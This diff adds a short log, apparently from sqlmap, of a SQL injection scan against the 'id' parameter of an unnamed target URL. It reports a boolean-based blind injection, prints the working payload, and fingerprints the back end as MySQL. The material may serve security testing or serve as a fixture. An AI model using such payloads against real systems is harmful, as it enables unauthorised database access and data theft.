@@ -1,0 +1,18 @@
+[INFO] testing connection to the target URL
+[INFO] testing if the target URL content is stable
+[INFO] target URL content is stable
+[INFO] testing if GET parameter 'id' is dynamic
+[INFO] GET parameter 'id' appears to be dynamic
+[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[INFO] testing for SQL injection on GET parameter 'id'
+[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
+
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 5851=5851 AND 'mDWN'='mDWN
+---
+[INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0
